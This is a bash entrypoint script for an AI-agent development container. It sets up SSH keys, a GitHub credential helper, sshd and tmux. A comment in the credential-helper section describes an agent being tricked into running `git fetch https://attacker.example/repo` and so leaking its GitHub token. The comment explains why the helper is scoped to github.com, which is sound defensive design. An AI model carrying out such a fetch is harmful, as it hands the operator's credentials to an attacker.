#!/usr/bin/env bash
# entrypoint.sh — container PID 1 for the agent-container image.
#
# Responsibilities (in order):
#   1. Validate required env vars (fail fast, never log their values).
#   2. Install/persist/generate the SSH host key + assemble authorized_keys
#      (from bind-mount, env, or the persisted ~/.ssh volume) as the dev user.
#   3. Configure git identity + HTTPS credential helper for the dev user.
#   4. Start sshd in the background.
#   5. Start a detached tmux session named 'main' for the dev user.
#   6. Stay alive as PID 1, forwarding SIGTERM/SIGINT to a clean shutdown.
#
# Runs as the non-root 'dev' user with NO root/sudo (fully rootless container):
# sshd runs as dev on an unprivileged port and the SSH host key lives in the
# dev-owned ~/.ssh volume. NEVER echoes env-var contents to logs.
#
# Override: if invoked with arguments, exec them instead of the default flow
# (e.g. `docker run image bash` for debugging).

set -euo pipefail

log() {
    # Stderr so it interleaves predictably with sshd's stderr logging.
    printf '[entrypoint] %s\n' "$*" >&2
}

die() {
    log "FATAL: $*"
    exit 1
}

# --- Debug override ---------------------------------------------------------
# If the operator passed a command (e.g. `bash`), run it instead of the default
# sshd+tmux flow. This lets the image be used interactively for debugging.
if [[ $# -gt 0 ]]; then
    exec "$@"
fi

# --- 1. Validate env vars ---------------------------------------------------
# Required: must be set AND non-empty. We check presence by name only; we never
# print or trace the values. `set -u` plus :- pattern keeps `set -e` from
# tripping on unset vars during the check itself.
require_env() {
    local name=$1
    if [[ -z "${!name:-}" ]]; then
        die "required env var ${name} is missing or empty"
    fi
}

require_env GH_TOKEN
require_env GIT_USER_NAME
require_env GIT_USER_EMAIL

# Optional: agents can authenticate either via these keys OR via interactive
# login inside the container ('claude login' / 'codex login'), whose OAuth
# credential persists on the per-container volume and auto-refreshes. So an
# absent key is only a NOTE, not a hard failure.
for opt in ANTHROPIC_API_KEY OPENAI_API_KEY; do
    if [[ -z "${!opt:-}" ]]; then
        log "NOTE: optional env var ${opt} is not set. Either set it in .env, or run the agent's interactive login inside the container (e.g. 'claude login' / 'codex login'); that credential persists on this container's volume across restarts."
    fi
done

# --- 1b. Seed persistent shell-env template ---------------------------------
# /home/dev/.agent-container lives on the per-container 'shellenv' named volume and is
# sourced into every interactive bash/zsh shell (see Dockerfile). On first boot
# the volume is empty, so drop a commented template explaining its purpose.
# Idempotent: never overwrite an existing file, and never echo its contents.
# Home base is /home/dev in the image (deliberately hardcoded, not $HOME, since
# the runtime may not export HOME for the non-root user). AGENT_CONTAINER_HOME lets the
# off-container test harness redirect this one path; production leaves it unset
# so the default is byte-identical to the previous behavior.
AGENT_CONTAINER_HOME="${AGENT_CONTAINER_HOME:-/home/dev}"
AGENT_CONTAINER_ENV_FILE="${AGENT_CONTAINER_HOME}/.agent-container/env"
if [[ ! -f "${AGENT_CONTAINER_ENV_FILE}" ]]; then
    log "seeding persistent shell-env template at ${AGENT_CONTAINER_ENV_FILE}"
    mkdir -p "${AGENT_CONTAINER_HOME}/.agent-container"
    cat > "${AGENT_CONTAINER_ENV_FILE}" <<'EOF'
# ~/.agent-container/env — persistent shell environment for this agent-container container.
#
# This file lives on the per-container 'shellenv' named volume, so it survives
# `agent-container down` / `agent-container up` and crashes (it is dropped only by `down --purge`).
# It is sourced with `set -a` into every interactive bash and zsh shell,
# including tmux panes. Keep it to simple KEY=VALUE / export lines.
#
# Example:
#   export FOO=bar
EOF
else
    log "persistent shell-env file already present, leaving it alone"
fi

# --- 2. SSH host key (rootless: dev-owned, on the persisted ~/.ssh volume) ---
# The host key lives in ~/.ssh/hostkeys (a per-container named volume), so a
# container keeps a STABLE identity across down/up while different containers
# differ. Generated as the dev user — no root. ssh-keygen -A cannot target a
# custom dir, so we generate the single ed25519 key explicitly. Idempotent:
# only generate if absent (a persisted or injected key is left untouched).
SSH_DIR="${AGENT_CONTAINER_HOME}/.ssh"
HOSTKEY_DIR="${SSH_DIR}/hostkeys"
HOSTKEY="${HOSTKEY_DIR}/ssh_host_ed25519_key"
mkdir -p "${HOSTKEY_DIR}"
chmod 0700 "${SSH_DIR}" "${HOSTKEY_DIR}"

# Host-key source precedence (highest first). A container adopts an operator-
# supplied identity if given, else keeps its persisted one, else generates:
#   1. bind-mounted file at /run/agent-container/ssh_host_ed25519_key (`up --host-key`)
#   2. SSH_HOST_ED25519_KEY_B64 env var (base64 of the private key; env-file channel)
#   3. already-persisted key on the ~/.ssh volume
#   4. freshly generated ed25519 key
# INJECT_DIR is where `up --host-key/--authorized-key` bind-mounts the key
# files. AGENT_CONTAINER_INJECT_DIR lets the off-container test harness redirect
# it; production leaves it unset so the default is the real bind-mount path.
INJECT_DIR="${AGENT_CONTAINER_INJECT_DIR:-/run/agent-container}"
if [[ -f "${INJECT_DIR}/ssh_host_ed25519_key" ]]; then
    log "installing bind-mounted SSH host key"
    install -m 0600 "${INJECT_DIR}/ssh_host_ed25519_key" "${HOSTKEY}"
elif [[ -n "${SSH_HOST_ED25519_KEY_B64:-}" ]]; then
    log "installing SSH host key from SSH_HOST_ED25519_KEY_B64"
    printf '%s' "${SSH_HOST_ED25519_KEY_B64}" | base64 -d > "${HOSTKEY}"
    chmod 0600 "${HOSTKEY}"
elif [[ ! -f "${HOSTKEY}" ]]; then
    log "generating SSH host key (ed25519) at ${HOSTKEY}"
    ssh-keygen -q -t ed25519 -f "${HOSTKEY}" -N ''
else
    log "SSH host key already present, skipping generation"
fi
# Validate the key and (re)derive its public half. A bad injected key fails fast
# here rather than as an opaque sshd startup error.
if ! ssh-keygen -y -f "${HOSTKEY}" > "${HOSTKEY}.pub" 2>/dev/null; then
    die "SSH host key at ${HOSTKEY} is missing or invalid"
fi
chmod 0600 "${HOSTKEY}"
chmod 0644 "${HOSTKEY}.pub"

# --- 2b. authorized_keys: union of persisted + injected sources, deduped -----
# Non-secret (public keys). Sources: the persisted file, a bind-mounted file
# (`up --authorized-key`), and the SSH_AUTHORIZED_KEYS env var. Deduped so
# repeated boots and overlapping sources don't accumulate duplicates.
AUTHKEYS="${SSH_DIR}/authorized_keys"
_akt="$(mktemp)"
[[ -f "${AUTHKEYS}" ]] && cat "${AUTHKEYS}" >> "${_akt}"
[[ -f "${INJECT_DIR}/authorized_keys" ]] && cat "${INJECT_DIR}/authorized_keys" >> "${_akt}"
[[ -n "${SSH_AUTHORIZED_KEYS:-}" ]] && printf '%s\n' "${SSH_AUTHORIZED_KEYS}" >> "${_akt}"
if [[ -s "${_akt}" ]]; then
    awk 'NF && !seen[$0]++' "${_akt}" > "${AUTHKEYS}"
    chmod 0600 "${AUTHKEYS}"
    log "authorized_keys assembled ($(grep -c . "${AUTHKEYS}") key(s))"
fi
rm -f "${_akt}"

# sshd's privilege-separation directory (/run/sshd) is created root-owned at
# build time; a rootless sshd only needs it to exist, not to write to it.

# --- 3. Git identity + credential helper ------------------------------------
# Identity is non-secret; logging the name is fine. Email is also non-secret
# but we still don't echo it — keep the log surface minimal.
git config --global user.name "${GIT_USER_NAME}"
git config --global user.email "${GIT_USER_EMAIL}"
git config --global init.defaultBranch main
git config --global pull.rebase false

# Credential helper as a shell function. Single quotes are CRITICAL: the body
# is stored VERBATIM in ~/.gitconfig, so ${GH_TOKEN} is expanded by the helper
# shell at git-push time from the process env — not by this script now. The
# token is never written to disk in the container.
#
# SCOPED to https://github.com deliberately. A GLOBAL credential.helper would
# hand ${GH_TOKEN} to git for ANY https host it authenticates against — so an
# autonomous agent tricked into `git fetch https://attacker.example/repo` would
# leak the GitHub token to that host as Basic auth. The URL-scoped key only fires
# for github.com; no global helper is set, so other hosts get no credential at all.
git config --global credential.https://github.com.helper \
    '!f() { echo "username=x-access-token"; echo "password=${GH_TOKEN}"; }; f'

log "Configured git identity for ${GIT_USER_NAME}"

# --- 3b. Outbound SSH push key (Feature 003, US1) ---------------------------
# The agent PUSHES with a key DISTINCT from the inbound sshd host key. It is
# injected EPHEMERALLY (INJECT_DIR is a /run compose config) and MUST NOT be
# copied onto the persisted ~/.ssh volume (FR-012) — the operator's local copy is
# the sole durable copy. ssh refuses a group/world-readable private key and the
# injected file is 0644, so copy it to a 0600 file in an EPHEMERAL, container-
# private dir (under /tmp — vanishes with the container, never a named volume) and
# point git's ssh command at it. Layered alongside the HTTPS+GH_TOKEN helper
# above: the operator selects per remote (git@github.com vs https://github.com).
PUSH_RUNTIME="${AGENT_CONTAINER_PUSH_RUNTIME:-/tmp/agent-container-push.$(id -u)}"
_push_src=""
if [[ -f "${INJECT_DIR}/push_ed25519_key" ]]; then
    _push_src="${INJECT_DIR}/push_ed25519_key"
elif [[ -n "${SSH_PUSH_KEY_B64:-}" ]]; then
    mkdir -p "${PUSH_RUNTIME}" && chmod 700 "${PUSH_RUNTIME}"
    if printf '%s' "${SSH_PUSH_KEY_B64}" | base64 -d > "${PUSH_RUNTIME}/.b64" 2>/dev/null; then
        _push_src="${PUSH_RUNTIME}/.b64"
    fi
fi
if [[ -n "${_push_src}" ]]; then
    mkdir -p "${PUSH_RUNTIME}" && chmod 700 "${PUSH_RUNTIME}"
    install -m 0600 "${_push_src}" "${PUSH_RUNTIME}/push_key"
    rm -f "${PUSH_RUNTIME}/.b64"
    # A WRITABLE known_hosts (empty or pre-seeded from the injected file / env) so
    # accept-new never prompts: a pre-seeded entry means the remote is already
    # trusted; otherwise it is trusted-on-first-use and appended here.
    : > "${PUSH_RUNTIME}/known_hosts"
    if [[ -f "${INJECT_DIR}/known_hosts" ]]; then
        cat "${INJECT_DIR}/known_hosts" > "${PUSH_RUNTIME}/known_hosts"
    elif [[ -n "${PUSH_KNOWN_HOSTS:-}" ]]; then
        printf '%s\n' "${PUSH_KNOWN_HOSTS}" > "${PUSH_RUNTIME}/known_hosts"
    fi
    # core.sshCommand (in the ephemeral ~/.gitconfig) applies to every git push —
    # more robust than GIT_SSH_COMMAND, which would need env propagation into each
    # tmux/ssh session. IdentitiesOnly=yes so only this key is offered (no prompt).
    git config --global core.sshCommand \
        "ssh -i ${PUSH_RUNTIME}/push_key -o IdentitiesOnly=yes -o UserKnownHostsFile=${PUSH_RUNTIME}/known_hosts -o StrictHostKeyChecking=accept-new"
    log "Configured outbound git push over SSH (ephemeral key; IdentitiesOnly)"
fi

# --- 4. sshd ----------------------------------------------------------------
# Daemonize (no -D) so the entrypoint can continue to start tmux and tail.
# Started as the dev user (rootless) — sshd listens on the unprivileged port
# 2222 with its host key + pidfile under the dev-owned ~/.ssh volume.
# sshd's own logs go to stderr / syslog per the image's sshd_config.
# AGENT_CONTAINER_SSHD lets the test harness substitute a stub; production
# leaves it unset so the default is the real sshd binary.
"${AGENT_CONTAINER_SSHD:-/usr/sbin/sshd}"
log "sshd listening"

# --- 5. tmux session --------------------------------------------------------
# Detached session named 'main'. On first creation, build a configurable set of
# windows from AGENT_CONTAINER_TMUX_WINDOWS (space-separated names). Default when unset:
# "shell edit agents". Opt-out: setting AGENT_CONTAINER_TMUX_WINDOWS to an EMPTY string
# creates just a single default window (today's behavior). Windows are BARE
# SHELLS — agents are NEVER auto-launched via send-keys. Idempotent: the layout
# is built only inside the has-session guard (when the session does not already
# exist), so a restart never duplicates windows. Each requested window name is
# validated against a safe charset before it reaches tmux; invalid names are
# skipped, never forwarded unsanitized. No env-var value is ever echoed.
if tmux has-session -t main 2>/dev/null; then
    log "tmux session 'main' already exists, leaving it alone"
else
    # '-' (not ':-') so an unset var falls back to the default layout while an
    # explicitly-empty value is honored as an opt-out.
    tmux_windows="${AGENT_CONTAINER_TMUX_WINDOWS-shell edit agents}"
    valid_windows=()
    for w in ${tmux_windows}; do
        if [[ "${w}" =~ ^[A-Za-z0-9._-]+$ ]]; then
            valid_windows+=("${w}")
        else
            log "skipping invalid tmux window name (must match [A-Za-z0-9._-]+)"
        fi
    done
    if [[ ${#valid_windows[@]} -eq 0 ]]; then
        # Opt-out (empty var) or every requested name rejected: single window.
        tmux new-session -d -s main
        log "tmux session 'main' ready (single default window)"
    else
        # First window carries the session and is named after the first entry.
        # Capture its window id so we can reselect it UNAMBIGUOUSLY below: an
        # all-numeric name (permitted by the charset) would otherwise be read by
        # `select-window -t main:NAME` as a window INDEX, landing on the wrong
        # window. The #{window_id} form (e.g. '@0') is never index-ambiguous.
        first_id="$(tmux new-session -d -P -F '#{window_id}' -s main -n "${valid_windows[0]}")"
        for (( wi = 1; wi < ${#valid_windows[@]}; wi++ )); do
            tmux new-window -t main -n "${valid_windows[wi]}"
        done
        # Select the first window so an attach lands there (by id, not name).
        tmux select-window -t "${first_id}"
        log "tmux session 'main' ready with ${#valid_windows[@]} window(s)"
    fi
fi

# --- 6. PID 1 lifecycle + signal handling -----------------------------------
# Trap SIGTERM/SIGINT for a clean shutdown: stop the tmux server, stop sshd,
# then exit 0. `tail -f /dev/null &` + `wait` is the canonical pattern that
# lets bash's trap fire promptly (a foreground `exec tail` would not).

shutdown() {
    log "shutdown signal received, stopping tmux and sshd"
    tmux kill-server 2>/dev/null || true
    # sshd runs as dev (rootless); dev can signal its own process — no sudo.
    pkill -TERM -x sshd 2>/dev/null || true
    exit 0
}

trap shutdown TERM INT

tail -f /dev/null &
TAIL_PID=$!
wait "${TAIL_PID}"
